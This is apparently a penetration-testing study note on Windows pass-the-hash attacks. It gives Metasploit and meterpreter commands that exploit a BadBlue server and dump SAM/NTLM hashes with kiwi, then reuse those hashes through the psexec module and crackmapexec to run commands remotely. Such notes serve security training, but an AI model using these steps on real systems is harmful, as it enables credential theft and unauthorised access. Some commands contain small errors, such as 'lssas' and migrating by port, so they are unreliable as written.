---
up: "[[Windows Credential Dumping]]"
tools:
  - "[[Metasploit]]"
  - "[[crackmapexec]]"
  - "[[PsExec]]"
---

# Pass-The-Hash Attacks

- What can we do with hashes?
	- Crack them (later)
	- Use Pass-the-hash attacks

- Multiple tools to facilitate this type of attacks:
	- Metasploit PsExec module
	- Crackmapexec

## Demonstration

```bash
> use exploit/windows/http/badblue_passthru
> set RHOSTS $TRG
meterpreter> pgrep lssas
meterpreter> migrate <port>
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter> load kiwi
meterpreter> lsa_dump_sam
```

Copy ``User`` and ``Hash NTLM`` section

```bash
meterpreter> hashdump
# copy same user hash
> exploit/windows/smb/psexec
> set SMBUser Administrator
> set SMBPass <hash>:<hashdump>
> set target Native\ upload
```

### Using crackmapexec

```bash
crackmapexec smb $TRG -u Administrator -H "<ntlm_hash>"
crackmapexec smb $TRG -u Administrator -H "<ntlm_hash>" -x "ipconfig"
```
